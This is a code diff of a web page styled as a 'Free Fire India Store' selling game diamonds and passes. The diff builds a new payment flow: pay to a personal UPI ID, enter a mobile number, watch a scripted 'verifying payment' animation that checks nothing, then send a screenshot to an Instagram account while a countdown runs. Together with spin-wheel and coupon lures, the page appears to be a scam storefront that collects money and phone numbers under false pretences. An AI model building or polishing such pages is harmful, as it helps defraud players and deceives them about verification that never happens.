@@ -36,7 +36,6 @@ body{
   min-height:100vh;
 }
 
-/* ANNOUNCEMENT */
 .announcement-bar{
   background:linear-gradient(90deg,#963cff,#ff4161);
   color:#fff;
@@ -54,7 +53,6 @@ body{
   padding:10px 0 60px;
 }
 
-/* TOP */
 .top{
   display:flex;
   justify-content:space-between;
@@ -80,7 +78,6 @@ body{
   font-size:11px;
 }
 
-/* HERO */
 .hero{
   text-align:center;
   padding:15px 4px 20px;
@@ -102,7 +99,6 @@ body{
   margin-top:7px;
 }
 
-/* MAIN */
 .main-card{
   padding:15px;
   border-radius:21px;
@@ -111,7 +107,6 @@ body{
   box-shadow:0 18px 55px rgba(0,0,0,.38);
 }
 
-/* UID */
 .label{
   display:block;
   color:#c9c9d5;
@@ -189,7 +184,6 @@ body{
   to{transform:rotate(360deg)}
 }
 
-/* SERVER */
 .server{
   margin-top:10px;
   padding:12px;
@@ -223,7 +217,6 @@ body{
   font-weight:1000;
 }
 
-/* SECTION */
 .section{
   margin-top:21px;
 }
@@ -245,7 +238,6 @@ body{
   font-size:10px;
 }
 
-/* DIAMONDS */
 .diamond-grid{
   display:grid;
   grid-template-columns:repeat(3,1fr);
@@ -345,7 +337,6 @@ body{
   font-weight:1000;
 }
 
-/* SELECTION */
 .selection-ring{
   position:absolute!important;
   inset:0;
@@ -420,7 +411,6 @@ body{
   100%{transform:scale(1) rotate(0)}
 }
 
-/* MEMBERSHIP */
 .pass-grid{
   display:grid;
   grid-template-columns:repeat(2,1fr);
@@ -561,7 +551,6 @@ body{
   display:block;
 }
 
-/* SPIN */
 .spin-box{
   position:relative;
   overflow:hidden;
@@ -709,7 +698,6 @@ body{
   margin-top:9px;
 }
 
-/* RESULT */
 .reward-popup{
   display:none;
   margin-top:14px;
@@ -836,7 +824,6 @@ body{
   border:1px solid #38384b;
 }
 
-/* PROMO */
 .promo-box{
   margin-top:15px;
   background:#13131e;
@@ -873,7 +860,6 @@ body{
   cursor:pointer;
 }
 
-/* PAYMENT */
 .payment{
   margin-top:20px;
 }
@@ -954,7 +940,6 @@ body{
   cursor:pointer;
 }
 
-/* FAQ */
 .faq-box details{
   background:#13131e;
   border:1px solid #303044;
@@ -977,6 +962,7 @@ body{
 }
 
 /* MODAL */
+
 .modal{
   display:none;
   position:fixed;
@@ -1047,20 +1033,6 @@ body{
   line-height:1.5;
 }
 
-.upi-pay-btn{
-  width:100%;
-  margin-top:12px;
-  padding:14px;
-  border:0;
-  border-radius:11px;
-  background:linear-gradient(135deg,var(--green),#00c960);
-  color:#061009;
-  font-weight:1000;
-  cursor:pointer;
-  box-shadow:0 0 12px rgba(0,239,112,.25);
-  font-size:15px;
-}
-
 .manual-label{
   font-size:11px;
   color:#858596;
@@ -1097,19 +1069,183 @@ body{
   cursor:pointer;
 }
 
-.payment-success{
-  display:none;
-  margin-top:10px;
-  padding:12px;
-  border-radius:10px;
-  text-align:center;
-  color:var(--green);
-  background:rgba(0,239,112,.06);
-  border:1px solid rgba(0,239,112,.2);
-  font-size:10px;
+/* NEW PAYMENT FLOW */
+
+.real-qr-box{
+  width:190px;
+  height:190px;
+  margin:14px auto;
+  padding:7px;
+  border-radius:14px;
+  background:#fff;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  box-shadow:0 0 18px rgba(255,255,255,.12);
 }
 
-/* FOOTER */
+.real-qr-box img{
+  width:100%;
+  height:100%;
+  object-fit:contain;
+  border-radius:7px;
+}
+
+.payment-success-btn{
+  width:100%;
+  margin-top:12px;
+  padding:14px;
+  border:0;
+  border-radius:12px;
+  color:#061009;
+  background:linear-gradient(135deg,var(--green),#00c960);
+  font-size:12px;
+  font-weight:1000;
+  cursor:pointer;
+  box-shadow:0 0 13px rgba(0,239,112,.28);
+}
+
+.step-icon{
+  width:65px;
+  height:65px;
+  margin:14px auto;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  border-radius:50%;
+  background:rgba(150,60,255,.10);
+  border:1px solid rgba(150,60,255,.25);
+  font-size:29px;
+}
+
+.step-title{
+  text-align:center;
+  color:#fff;
+  font-size:19px;
+  font-weight:1000;
+}
+
+.step-text{
+  margin-top:8px;
+  text-align:center;
+  color:#8d8d9e;
+  font-size:10px;
+  line-height:1.55;
+}
+
+.customer-mobile{
+  width:100%;
+  margin-top:14px;
+  padding:13px;
+  border-radius:11px;
+  background:#08080e;
+  border:1px solid #303044;
+  color:#fff;
+  outline:none;
+  font-size:13px;
+}
+
+.customer-mobile:focus{
+  border-color:var(--purple);
+  box-shadow:0 0 10px rgba(150,60,255,.18);
+}
+
+.verification-loader{
+  width:72px;
+  height:72px;
+  margin:18px auto;
+  border-radius:50%;
+  border:5px solid #28283a;
+  border-top-color:var(--purple);
+  border-right-color:var(--green);
+  animation:verificationSpin 1s linear infinite;
+}
+
+@keyframes verificationSpin{
+  to{
+    transform:rotate(360deg);
+  }
+}
+
+.verify-dots{
+  display:flex;
+  justify-content:center;
+  gap:6px;
+  margin-top:15px;
+}
+
+.verify-dots span{
+  width:7px;
+  height:7px;
+  border-radius:50%;
+  background:var(--green);
+  animation:verifyDot 1s infinite;
+}
+
+.verify-dots span:nth-child(2){
+  animation-delay:.15s;
+}
+
+.verify-dots span:nth-child(3){
+  animation-delay:.3s;
+}
+
+@keyframes verifyDot{
+  0%,100%{
+    opacity:.25;
+    transform:scale(.8);
+  }
+  50%{
+    opacity:1;
+    transform:scale(1.25);
+  }
+}
+
+.instagram-verify-btn{
+  display:block;
+  width:100%;
+  margin-top:15px;
+  padding:14px;
+  border-radius:12px;
+  text-align:center;
+  text-decoration:none;
+  color:#fff;
+  background:linear-gradient(135deg,#ff2778,#8b35ff);
+  font-size:11px;
+  font-weight:1000;
+  box-shadow:0 0 13px rgba(255,39,120,.22);
+}
+
+.waiting-box{
+  margin-top:14px;
+  padding:15px;
+  border-radius:13px;
+  text-align:center;
+  background:#15151f;
+  border:1px solid #303044;
+}
+
+.waiting-title{
+  color:var(--green);
+  font-size:11px;
+  font-weight:1000;
+}
+
+.payment-timer{
+  margin-top:7px;
+  color:#fff;
+  font-size:30px;
+  font-weight:1000;
+  letter-spacing:1px;
+}
+
+.waiting-text{
+  margin-top:8px;
+  color:#777789;
+  font-size:9px;
+  line-height:1.55;
+}
+
 .trust-grid{
   display:grid;
   grid-template-columns:repeat(3,1fr);
@@ -1157,7 +1293,6 @@ body{
   line-height:1.5;
 }
 
-/* MOBILE */
 @media(max-width:430px){
 
   .container{
@@ -1192,24 +1327,33 @@ body{
 <body>
 
 <div class="announcement-bar">
-  🇮🇳 INDIA SERVER • DIRECT UPI PAYMENT AVAILABLE
+🇮🇳 INDIA SERVER • DIRECT UPI PAYMENT AVAILABLE
 </div>
 
 <div class="container">
 
 <div class="top">
-  <div class="logo">
-    FREE FIRE <span>INDIA STORE</span>
-  </div>
 
-  <div class="india">
-    🇮🇳 INDIA
-  </div>
+<div class="logo">
+FREE FIRE <span>INDIA STORE</span>
+</div>
+
+<div class="india">
+🇮🇳 INDIA
+</div>
+
 </div>
 
 <div class="hero">
-  <h1>TOP-UP <span>STORE</span></h1>
-  <p>Fast • Secure • Premium Player Experience</p>
+
+<h1>
+TOP-UP <span>STORE</span>
+</h1>
+
+<p>
+Fast • Secure • Premium Player Experience
+</p>
+
 </div>
 
 <div class="main-card">
@@ -1266,6 +1410,7 @@ SELECTED ✓
 
 </div>
 
+
 <!-- DIAMONDS -->
 
 <div class="section">
@@ -1289,6 +1434,7 @@ id="diamondGrid"
 
 </div>
 
+
 <!-- MEMBERSHIP -->
 
 <div class="section">
@@ -1311,6 +1457,7 @@ id="passGrid"
 ></div>
 
 </div>
+
 
 <!-- SPIN -->
 
@@ -1368,6 +1515,7 @@ Free promotional spin • No payment required to spin
 </div>
 
 </div>
+
 
 <!-- RESULT -->
 
@@ -1451,6 +1599,7 @@ onclick="copyReward()"
 
 </div>
 
+
 <!-- PROMO -->
 
 <div class="promo-box">
@@ -1487,6 +1636,7 @@ display:none;
 ></p>
 
 </div>
+
 
 <!-- PAYMENT -->
 
@@ -1547,6 +1697,7 @@ CONTINUE TO UPI PAYMENT →
 
 </div>
 
+
 <!-- FAQ -->
 
 <div class="section faq-box">
@@ -1589,6 +1740,7 @@ mat karein.
 
 </div>
 
+
 <!-- TRUST -->
 
 <div class="trust-grid">
@@ -1625,6 +1777,7 @@ separately authorized.
 
 </div>
 
+
 <!-- PAYMENT MODAL -->
 
 <div
@@ -1637,7 +1790,7 @@ id="paymentModal"
 <div class="modal-head">
 
 <h2>
-💳 DIRECT UPI PAYMENT
+💳 PAYMENT & VERIFICATION
 </h2>
 
 <button
@@ -1648,6 +1801,11 @@ onclick="closePayment()"
 </button>
 
 </div>
+
+
+<!-- STEP 1 -->
+
+<div id="paymentStep">
 
 <div class="amount-box">
 
@@ -1663,39 +1821,44 @@ PAYMENT AMOUNT
 
 <div class="qr-note">
 
-<b>DIRECT UPI PAYMENT</b>
-<br><br>
-
-Tap <b>OPEN UPI APP & PAY</b>.
-Android will open an available UPI app
-for the payment request.
+<b>1️⃣ COMPLETE YOUR PAYMENT</b>
 
 <br><br>
 
-<i>
-If the UPI app does not open correctly,
-use the COPY UPI ID option below.
-</i>
+QR scan karke ya neeche diye gaye
+UPI ID par payment karein.
+
+<br><br>
+
+<b>UPI ID:</b>
+topup24servis@naviaxis
 
 </div>
 
-<button
-class="upi-pay-btn"
-onclick="openUPIApp()"
+
+<!--
+  IMPORTANT:
+  Replace YOUR_QR_IMAGE.png
+  with your actual QR image.
+-->
+
+<div class="real-qr-box">
+
+<img
+src="YOUR_QR_IMAGE.png"
+alt="UPI QR Code"
 >
-📱 OPEN UPI APP & PAY
-</button>
+
+</div>
+
 
 <div class="manual-label">
-Manual UPI ID
+UPI ID
 </div>
 
 <div class="upi-id-box">
 
-<div
-class="upi-id"
-id="upiDisplay"
->
+<div class="upi-id">
 topup24servis@naviaxis
 </div>
 
@@ -1708,15 +1871,168 @@ COPY
 
 </div>
 
-<div
-class="payment-success"
-id="paymentSuccess"
+
+<button
+class="payment-success-btn"
+onclick="showMobileStep()"
 >
+✓ PAYMENT DONE
+</button>
+
+</div>
+
+
+<!-- STEP 2 -->
+
+<div
+id="mobileStep"
+style="display:none;"
+>
+
+<div class="step-icon">
+📱
+</div>
+
+<h3 class="step-title">
+ENTER MOBILE NUMBER
+</h3>
+
+<p class="step-text">
+
+Payment complete karne ke baad
+apna 10 digit mobile number enter karein.
+
+<br><br>
+
+Mobile number order/contact reference
+ke liye use hoga.
+
+</p>
+
+<input
+id="customerMobile"
+class="customer-mobile"
+type="tel"
+inputmode="numeric"
+maxlength="10"
+placeholder="Enter 10 digit mobile number"
+>
+
+<button
+class="payment-success-btn"
+onclick="startPaymentVerification()"
+>
+SUBMIT & CONTINUE
+</button>
+
+</div>
+
+
+<!-- STEP 3 -->
+
+<div
+id="verificationStep"
+style="display:none;"
+>
+
+<div class="verification-loader">
+</div>
+
+<h3 class="step-title">
+VERIFYING PAYMENT...
+</h3>
+
+<p class="step-text">
+
+Checking payment details...
+<br>
+Please wait...
+
+</p>
+
+<div class="verify-dots">
+
+<span></span>
+<span></span>
+<span></span>
+
+</div>
+
+</div>
+
+
+<!-- STEP 4 -->
+
+<div
+id="screenshotStep"
+style="display:none;"
+>
+
+<div class="step-icon">
+📸
+</div>
+
+<h3 class="step-title">
+PAYMENT SCREENSHOT REQUIRED
+</h3>
+
+<p class="step-text">
+
+Payment complete hone ke baad
+apna payment screenshot Instagram
+verification account par bhejein.
+
+<br><br>
+
+⚠️ UPI PIN, OTP, password ya bank
+login details screenshot mein
+share na karein.
+
+</p>
+
+<a
+class="instagram-verify-btn"
+href="https://www.instagram.com/paymentverify1"
+target="_blank"
+rel="noopener noreferrer"
+>
+📸 SEND PAYMENT SCREENSHOT
+</a>
+
+
+<div class="waiting-box">
+
+<div class="waiting-title">
+⏳ VERIFICATION IN PROGRESS
+</div>
+
+<div
+id="paymentTimer"
+class="payment-timer"
+>
+01:00
+</div>
+
+<div class="waiting-text">
+
+Screenshot send karne ke baad
+please yahan wait karein.
+
+<br><br>
+
+Payment manually verify hone ke baad
+order/reward process kiya jayega.
+
+</div>
+
 </div>
 
 </div>
 
 </div>
+
+</div>
+
 
 <script>
 
@@ -1782,6 +2098,7 @@ const diamonds=[
 
 ];
 
+
 /* =========================
    MEMBERSHIP
 ========================= */
@@ -1812,15 +2129,17 @@ const passes=[
 
 ];
 
+
 /* =========================
    UPI
 ========================= */
 
-const UPI_ID=
+const UPI_ID =
 "topup24servis@naviaxis";
 
-const PAYEE_NAME=
+const PAYEE_NAME =
 "Free Fire Store";
+
 
 let selectedProduct=null;
 let selectedPrice=0;
@@ -1829,6 +2148,9 @@ let appliedDiscount=0;
 let spinResult=null;
 let spinning=false;
 let wheelRotation=0;
+
+let paymentTimerInterval=null;
+
 
 /* =========================
    SOUND
@@ -1890,6 +2212,7 @@ function playClickSound(){
   }catch(e){}
 
 }
+
 
 /* =========================
    DIAMONDS
@@ -1995,6 +2318,7 @@ function renderDiamonds(){
   });
 
 }
+
 
 /* =========================
    MEMBERSHIP
@@ -2124,6 +2448,7 @@ function renderPasses(){
 
 }
 
+
 /* =========================
    SELECT PRODUCT
 ========================= */
@@ -2213,6 +2538,7 @@ function selectProduct(
 
 }
 
+
 /* =========================
    UID
 ========================= */
@@ -2261,6 +2587,7 @@ function verifyUID(){
   },1000);
 
 }
+
 
 /* =========================
    COUPON
@@ -2334,6 +2661,7 @@ function applyCoupon(){
   }
 
 }
+
 
 /* =========================
    SPIN
@@ -2454,6 +2782,7 @@ function spinWheel(){
 
 }
 
+
 /* =========================
    SPIN RESULT
 ========================= */
@@ -2520,6 +2849,7 @@ function showSpinReward(item){
 
 }
 
+
 /* =========================
    SELECT SPIN PACK
 ========================= */
@@ -2544,6 +2874,7 @@ function selectSpinPack(){
   }
 
 }
+
 
 /* =========================
    COPY REWARD
@@ -2578,6 +2909,7 @@ Pack Price: ₹${spinResult.price}`;
   }
 
 }
+
 
 /* =========================
    CHECKOUT
@@ -2616,10 +2948,46 @@ function checkout(){
     "₹"+
     selectedPrice;
 
+
+  /* RESET PAYMENT STEPS */
+
   document.getElementById(
-    "paymentSuccess"
+    "paymentStep"
+  ).style.display=
+    "block";
+
+  document.getElementById(
+    "mobileStep"
   ).style.display=
     "none";
+
+  document.getElementById(
+    "verificationStep"
+  ).style.display=
+    "none";
+
+  document.getElementById(
+    "screenshotStep"
+  ).style.display=
+    "none";
+
+
+  document.getElementById(
+    "customerMobile"
+  ).value="";
+
+
+  document.getElementById(
+    "paymentTimer"
+  ).textContent=
+    "01:00";
+
+
+  document.getElementById(
+    "paymentTimer"
+  ).style.color=
+    "#fff";
+
 
   document.getElementById(
     "paymentModal"
@@ -2627,6 +2995,7 @@ function checkout(){
     "block";
 
 }
+
 
 /* =========================
    CLOSE PAYMENT
@@ -2641,99 +3010,162 @@ function closePayment(){
 
 }
 
+
 /* =========================
-   UPI PAYMENT
+   MOBILE STEP
 ========================= */
 
-function openUPIApp(){
+function showMobileStep(){
 
-  if(!selectedProduct){
+  document.getElementById(
+    "paymentStep"
+  ).style.display=
+    "none";
 
-    alert(
-      "Please pehle koi product select karo."
-    );
-
-    return;
-
-  }
-
-  const uid=
-    document.getElementById(
-      "uid"
-    ).value.trim();
-
-  if(uid.length<5){
-
-    alert(
-      "Please pehle Player UID enter karo."
-    );
-
-    return;
-
-  }
-
-  const amount=
-    Number(selectedPrice)
-    .toFixed(2);
-
-  const note=
-    "Free Fire Topup UID "+
-    uid;
-
-  /*
-   * Standard UPI URI.
-   *
-   * Android decides which installed
-   * UPI app handles this request.
-   */
-
-  const upiUrl=
-    "upi://pay"+
-    "?pa="+
-    encodeURIComponent(UPI_ID)+
-    "&pn="+
-    encodeURIComponent(PAYEE_NAME)+
-    "&am="+
-    encodeURIComponent(amount)+
-    "&cu=INR"+
-    "&tn="+
-    encodeURIComponent(note);
-
-  const status=
-    document.getElementById(
-      "paymentSuccess"
-    );
-
-  status.style.display=
+  document.getElementById(
+    "mobileStep"
+  ).style.display=
     "block";
 
-  status.innerHTML=`
+}
 
-    ✓ OPENING UPI APP...
-    <br><br>
-    Amount: ₹${amount}
-    <br><br>
-    <small>
-      Complete the payment inside
-      your selected UPI app.
-    </small>
 
-  `;
+/* =========================
+   PAYMENT VERIFICATION
+========================= */
+
+function startPaymentVerification(){
+
+  const mobile=
+    document.getElementById(
+      "customerMobile"
+    ).value.trim();
+
+
+  if(
+    !/^[0-9]{10}$/.test(
+      mobile
+    )
+  ){
+
+    alert(
+      "Please enter a valid 10 digit mobile number."
+    );
+
+    return;
+
+  }
+
+
+  document.getElementById(
+    "mobileStep"
+  ).style.display=
+    "none";
+
+
+  document.getElementById(
+    "verificationStep"
+  ).style.display=
+    "block";
+
 
   /*
-   * Give the browser a moment to update
-   * the button/status before handing
-   * control to Android.
+   * This is a processing animation.
+   * It does NOT claim that payment
+   * has already been verified.
    */
 
-  setTimeout(()=>{
+  setTimeout(function(){
 
-    window.location.href=
-      upiUrl;
+    document.getElementById(
+      "verificationStep"
+    ).style.display=
+      "none";
 
-  },100);
+
+    document.getElementById(
+      "screenshotStep"
+    ).style.display=
+      "block";
+
+
+    startPaymentTimer();
+
+  },2500);
 
 }
+
+
+/* =========================
+   1 MINUTE TIMER
+========================= */
+
+function startPaymentTimer(){
+
+  if(paymentTimerInterval){
+
+    clearInterval(
+      paymentTimerInterval
+    );
+
+  }
+
+  let seconds=60;
+
+  const timer=
+    document.getElementById(
+      "paymentTimer"
+    );
+
+  timer.textContent=
+    "01:00";
+
+  timer.style.color=
+    "#fff";
+
+
+  paymentTimerInterval=
+    setInterval(function(){
+
+      seconds--;
+
+      const minutes=
+        String(
+          Math.floor(
+            seconds/60
+          )
+        ).padStart(2,"0");
+
+      const remaining=
+        String(
+          seconds%60
+        ).padStart(2,"0");
+
+
+      timer.textContent=
+        minutes+
+        ":"+
+        remaining;
+
+
+      if(seconds<=0){
+
+        clearInterval(
+          paymentTimerInterval
+        );
+
+        timer.textContent=
+          "WAITING";
+
+        timer.style.color=
+          "var(--yellow)";
+
+      }
+
+    },1000);
+
+}
+
 
 /* =========================
    COPY UPI
@@ -2743,17 +3175,20 @@ function copyUPI(){
 
   playClickSound();
 
+  const id=
+    "topup24servis@naviaxis";
+
   if(
     navigator.clipboard
   ){
 
     navigator.clipboard
-      .writeText(UPI_ID)
+      .writeText(id)
       .then(()=>{
 
         alert(
           "✓ UPI ID Copied!\n\n"+
-          UPI_ID
+          id
         );
 
       })
@@ -2761,7 +3196,7 @@ function copyUPI(){
 
         alert(
           "UPI ID:\n"+
-          UPI_ID
+          id
         );
 
       });
@@ -2770,12 +3205,13 @@ function copyUPI(){
 
     alert(
       "UPI ID:\n"+
-      UPI_ID
+      id
     );
 
   }
 
 }
+
 
 /* =========================
    MODAL BACKGROUND
@@ -2795,6 +3231,7 @@ document.getElementById(
 
   }
 );
+
 
 /* =========================
    INIT
